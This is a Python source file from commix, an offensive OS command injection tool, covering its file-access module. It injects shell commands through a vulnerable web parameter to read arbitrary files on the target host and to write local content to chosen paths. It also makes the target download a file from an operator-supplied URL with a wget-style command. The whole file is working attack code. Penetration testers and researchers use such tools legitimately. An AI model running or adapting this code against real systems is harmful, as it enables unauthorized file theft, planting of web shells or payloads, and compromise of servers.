#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import urllib2

from src.utils import menu
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.results_based.techniques.classic import cb_injector

"""
  The "classic" technique on Result-based OS Command Injection.
"""

"""
Read a file from the target host.
"""
def file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
  file_to_read = menu.options.file_read
  # Execute command
  cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
  shell = cb_injector.injection_results(response, TAG)
  shell = "".join(str(p) for p in shell)
  if shell:
    if menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "(!) Contents of file " + Style.UNDERLINE + file_to_read + Style.RESET_ALL + " : ")
    sys.stdout.flush()
    print shell
  else:
   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL)
   sys.stdout.flush()


"""
Write to a file on the target host.
"""
def file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
  file_to_write = menu.options.file_write
  if not os.path.exists(file_to_write):
    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL)
    sys.stdout.flush()
    sys.exit(0)
    
  if os.path.isfile(file_to_write):
    with open(file_to_write, 'r') as content_file:
      content = [line.replace("\n", " ") for line in content_file]
    content = "".join(str(p) for p in content).replace("'", "\"")
  else:
    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
    sys.stdout.flush()
    
  # Check the file-destination
  if os.path.split(menu.options.file_dest)[1] == "" :
    dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
  elif os.path.split(menu.options.file_dest)[0] == "/":
    dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
  else:
    dest_to_write = menu.options.file_dest
    
  # Execute command
  cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
  shell = cb_injector.injection_results(response, TAG)
  shell = "".join(str(p) for p in shell)
  
  # Check if file exists!
  cmd = "echo $(ls " + dest_to_write + ")"
  # Check if defined cookie injection.
  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
  shell = cb_injector.injection_results(response, TAG)
  shell = "".join(str(p) for p in shell)
  if shell:
    if menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
    sys.stdout.flush()
  else:
   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL)
   sys.stdout.flush()


"""
Upload a file on the target host.
"""
def file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
  file_to_upload = menu.options.file_upload
  # check if remote file exists.
  try:
    urllib2.urlopen(file_to_upload)
  except urllib2.HTTPError, err:
    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n")
    sys.stdout.flush()
    sys.exit(0)
    
  # Check the file-destination
  if os.path.split(menu.options.file_dest)[1] == "" :
    dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
  elif os.path.split(menu.options.file_dest)[0] == "/":
    dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
  else:
    dest_to_upload = menu.options.file_dest
    
  # Execute command
  cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
  shell = cb_injector.injection_results(response, TAG)
  shell = "".join(str(p) for p in shell)
  
  # Check if file exists!
  cmd = "echo $(ls " + dest_to_upload + ")"
  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
  shell = cb_injector.injection_results(response, TAG)
  shell = "".join(str(p) for p in shell)
  if shell:
    if menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!\n" + Style.RESET_ALL)
    sys.stdout.flush()
  else:
   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL)
   sys.stdout.flush()

   
"""
Check the defined options
"""
def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
  if menu.options.file_read:
    file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)

  if menu.options.file_write:
    file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)

  if menu.options.file_upload:
    file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)

# eof